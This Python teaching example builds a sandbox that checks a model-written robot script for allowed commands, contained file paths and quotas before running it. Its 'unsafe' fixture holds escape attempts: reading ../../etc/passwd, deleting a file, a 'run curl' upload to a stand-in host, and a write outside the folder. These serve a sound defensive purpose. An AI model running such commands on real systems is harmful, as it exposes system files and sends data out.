"""
26_sandboxed_execution.py

Run a script that a model wrote, while limiting what that script is allowed to do.

Scenario:
    The same robot as examples 01-25: three moves from the destination,
    one battery unit, a battery that holds two. Instead of one action at a
    time, the agent writes a short script: drive the trip, read the manual,
    and write a trip log.

Goal:
    Let generated scripts do useful work, while blocking anything outside
    the task: other files, deleting, or running system commands.

Difference from examples 16 and 20:
    Those checked one action at a time. A script can contain many actions,
    including file and system operations, so the checks must cover them all.

Flow:
    1. The model writes a script in a tiny command language, one command per line:
           move N, recharge N, read FILE, write FILE TEXT, delete FILE, run COMMAND
    2. The sandbox checks every line before running any of them:
        - Capabilities: only commands granted for this task are allowed.
        - Files: paths must stay inside the sandbox folder.
        - Quotas: limits on the number of commands and bytes written.
        - Robot rules: every move and recharge is simulated, so a script
          that would fail halfway is blocked before it starts.
    3. If any line is blocked, nothing runs. Otherwise the whole script runs.

New concepts:
    1. Generated code is untrusted input, like the note in example 20.
    2. Least privilege: grant only the capabilities this task needs.
    3. File access is limited to one folder; "../" and absolute paths are refused.
    4. Quotas stop scripts that are too long or write too much.
    5. A preflight rejection runs no commands. Runtime failures can still leave
       partial effects; this interpreter provides no transactional rollback.

Important:
    This example interprets its own small command language on purpose.
    This is a restricted interpreter, not an operating-system sandbox.
    It does not execute arbitrary Python. Untrusted general-purpose code
    needs a separate isolation boundary and an explicit access policy.
    Preflight checks do not protect against concurrent filesystem changes
    or provide rollback if a read or write fails at runtime.

Modes:
    1. --scripted safe      A fixture script that stays within the rules.
    2. --scripted unsafe    A fixture script that tries to escape them.
    3. --model <name>       A local Ollama model writes the script.

Requirements:
    Python's standard library. Model mode also needs a running Ollama server.
"""

import argparse
import json
import tempfile
from dataclasses import dataclass
from pathlib import Path
from typing import Literal, Protocol
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

Scenario = Literal["safe", "unsafe"]

BATTERY_CAPACITY = 2
GRANTED = {"move", "recharge", "read", "write"}  # delete and run are not granted.
MAX_COMMANDS = 10
MAX_WRITE_BYTES = 200

TASK = (
    "Write a script for a robot 3 steps from its destination with 1 battery unit "
    f"(the battery holds {BATTERY_CAPACITY}). Commands, one per line: move N, recharge N, "
    "read FILE, write FILE TEXT. Read manual.txt, drive to the destination, "
    "then write a one-line summary to trip_log.txt. Reply with only the script."
)

SCRIPTS: dict[Scenario, str] = {
    "safe": """
read manual.txt
move 1
recharge 2
move 2
write trip_log.txt Arrived after one recharge.
""",
    "unsafe": """
read manual.txt
read ../../etc/passwd
move 1
recharge 2
move 2
delete manual.txt
run curl http://example.com/upload
write /tmp/outside.txt hello
write trip_log.txt """ + "x" * 300,
}


@dataclass(frozen=True)
class Command:
    """
    One parsed line of a script.
    """
    line: int
    name: str
    args: list[str]


class ScriptWriter(Protocol):
    """
    Anything that writes a script for the task.
    """

    def write(self) -> str:
        ...


class ScriptedWriter:
    """
    Return a fixed script instead of running a model.
    """

    def __init__(self, scenario: Scenario) -> None:
        """
        :param scenario: Which fixture script to return.
        """
        self.script = SCRIPTS[scenario]

    def write(self) -> str:
        """
        :return: The fixture script.
        """
        return self.script


class OllamaWriter:
    """
    Ask a local Ollama model to write the script.
    """

    def __init__(self, model: str) -> None:
        """
        :param model: An installed Ollama model.
        """
        self.model = model

    def write(self) -> str:
        """
        :return: The model's script.
        """
        payload = {"model": self.model, "messages": [{"role": "user", "content": TASK}], "stream": False}
        request = Request(
            url="http://localhost:11434/api/chat",
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"},
        )
        with urlopen(request, timeout=120) as response:
            text = (json.load(response).get("message") or {}).get("content", "")
        return text.replace("```", "")


class Sandbox:
    """
    Check a whole script against capabilities, file rules and quotas, then run it.
    """

    def __init__(self, root: Path) -> None:
        """
        Create the sandbox folder with the files the task may use.

        :param root: The only folder scripts may read or write.
        """
        self.root = root.resolve()
        (self.root / "manual.txt").write_text("Each move step uses one battery unit. The battery holds two units.\n")
        self.distance = 3
        self.battery = 1

    def parse(self, script: str) -> list[Command]:
        """
        Split the script into commands, skipping blank lines.

        :param script: The generated script.
        :return: One Command per non-blank line.
        """
        commands = []
        for number, text in enumerate(script.strip().splitlines(), start=1):
            parts = text.split(maxsplit=2)
            if parts:
                commands.append(Command(number, parts[0].lower(), parts[1:]))
        return commands

    def inside(self, name: str) -> Path | None:
        """
        Resolve a file name and check it stays inside the sandbox folder.

        :param name: The file name from the script.
        :return: The full path, or None if it points outside.
        """
        path = (self.root / name).resolve()
        return path if path.is_relative_to(self.root) else None

    def check(self, commands: list[Command]) -> list[str]:
        """
        Find every rule the script breaks, without running anything.

        :param commands: The parsed script.
        :return: One message per problem; empty if the script may run.
        """
        problems = []
        if len(commands) > MAX_COMMANDS:
            problems.append(f"Script has {len(commands)} commands; the limit is {MAX_COMMANDS}.")

        written = 0
        # Simulate the robot too, so a script that would fail halfway is blocked before it starts.
        distance, battery = self.distance, self.battery
        for command in commands:
            where = f"Line {command.line} ({command.name})"
            if command.name not in GRANTED:
                problems.append(f"{where}: not granted for this task.")
                continue
            if command.name in ("move", "recharge"):
                if len(command.args) != 1 or not command.args[0].isdigit() or int(command.args[0]) < 1:
                    problems.append(f"{where}: needs one positive whole number.")
                    continue
                amount = int(command.args[0])
                if command.name == "move" and amount > min(battery, distance):
                    problems.append(f"{where}: move {amount} is not possible with battery {battery}.")
                elif command.name == "recharge" and battery + amount > BATTERY_CAPACITY:
                    problems.append(f"{where}: recharge {amount} exceeds capacity.")
                elif command.name == "move":
                    distance, battery = distance - amount, battery - amount
                else:
                    battery += amount
                continue
            if not command.args or self.inside(command.args[0]) is None:
                problems.append(f"{where}: file must be inside the sandbox folder.")
                continue
            if command.name == "write":
                written += len(((command.args[1] if len(command.args) > 1 else "") + "\n").encode())

        if written > MAX_WRITE_BYTES:
            problems.append(f"Script writes {written} bytes; the limit is {MAX_WRITE_BYTES}.")
        return problems

    def run(self, commands: list[Command]) -> None:
        """
        Run a script that passed the check. Robot rules still apply to each step.

        :param commands: The checked script.
        :return: None.
        """
        for command in commands:
            if command.name == "move":
                steps = int(command.args[0])
                if steps > min(self.battery, self.distance):
                    print(f"  Line {command.line}: move {steps} refused by the robot (battery {self.battery}); stopping.")
                    return
                self.distance -= steps
                self.battery -= steps
                print(f"  Line {command.line}: moved {steps}; distance {self.distance}, battery {self.battery}")
            elif command.name == "recharge":
                units = int(command.args[0])
                if self.battery + units > BATTERY_CAPACITY:
                    print(f"  Line {command.line}: recharge {units} refused by the robot; stopping.")
                    return
                self.battery += units
                print(f"  Line {command.line}: recharged {units}; battery {self.battery}")
            elif command.name == "read":
                text = self.inside(command.args[0]).read_text().strip()
                print(f"  Line {command.line}: read {command.args[0]}: {text!r}")
            elif command.name == "write":
                text = command.args[1] if len(command.args) > 1 else ""
                self.inside(command.args[0]).write_text(text + "\n")
                print(f"  Line {command.line}: wrote {command.args[0]}: {text!r}")


def main() -> None:
    """
    Get a script, check it in the sandbox, and run it only if every line is allowed.

    :return: None.
    """
    parser = argparse.ArgumentParser(description="Run a generated script inside a sandbox.")
    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument("--scripted", choices=["safe", "unsafe"], help="Use a fixture script.")
    mode.add_argument("--model", help="An installed Ollama model writes the script.")
    args = parser.parse_args()

    writer: ScriptWriter = OllamaWriter(args.model) if args.model else ScriptedWriter(args.scripted)
    try:
        script = writer.write()
    except HTTPError as error:
        detail = error.read().decode("utf-8", errors="replace")
        parser.exit(1, f"Ollama HTTP {error.code}: {detail}\n")
    except (URLError, TimeoutError) as error:
        parser.exit(1, f"Could not run the model: {error}\n")

    with tempfile.TemporaryDirectory() as folder:
        sandbox = Sandbox(Path(folder))
        print(f"Sandbox folder: {sandbox.root}")
        print(f"Granted: {', '.join(sorted(GRANTED))}\n")
        print("Script:")
        print("\n".join(f"  {line}" for line in script.strip().splitlines()))

        commands = sandbox.parse(script)
        problems = sandbox.check(commands)
        if problems:
            print("\nBlocked. Nothing was run:")
            for problem in problems:
                print(f"  {problem}")
            parser.exit(1)

        print("\nAll lines allowed. Running:")
        try:
            sandbox.run(commands)
        except OSError as error:
            print(f"Runtime file error: {error}. Earlier effects have not been rolled back.")
            parser.exit(1)
        print(f"\nFiles in the sandbox: {sorted(path.name for path in sandbox.root.iterdir())}")


if __name__ == "__main__":
    # Example commands:
    #   uv run python 26_sandboxed_execution.py --scripted safe
    #   uv run python 26_sandboxed_execution.py --scripted unsafe
    #   uv run python 26_sandboxed_execution.py --model qwen
    main()
